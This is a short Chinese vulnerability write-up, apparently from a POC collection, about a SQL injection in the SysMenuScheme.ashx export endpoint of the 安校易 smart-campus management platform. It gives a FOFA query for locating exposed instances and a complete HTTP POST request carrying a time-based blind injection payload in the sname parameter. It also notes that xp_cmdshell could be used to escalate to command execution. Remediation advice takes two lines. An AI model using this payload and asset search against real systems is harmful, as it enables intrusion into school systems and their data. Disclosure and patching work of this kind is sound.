## 智慧校园综合管理平台(安校易) SysMenuScheme.ashx SQL注入漏洞

## 漏洞描述
`SysMenuScheme.ashx` 导出接口未对 `sname` 参数进行过滤，攻击者可通过构造 `WAITFOR DELAY` 等语句实现时间盲注，进一步利用数据库 `xp_cmdshell` 执行系统命令。

## 影响范围
- 智慧校园综合管理平台(安校易)（版本待补充）

## 资产测绘
```
fofa: title="智慧综合管理平台登入"
```

## POC
```
POST /Module/Kernel/Controller/SysMenuScheme.ashx HTTP/1.1
Host: <target>
User-Agent: Mozilla/5.0 (Knoppix; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Connection: close

action=exportExcel&sname='waitfor+delay'0:0:4'--
```
接口返回延迟 4 秒即说明存在注入。

## 修复建议
- 对输入参数进行参数化查询，禁用危险关键字
- 最小化数据库权限，关闭 `xp_cmdshell`

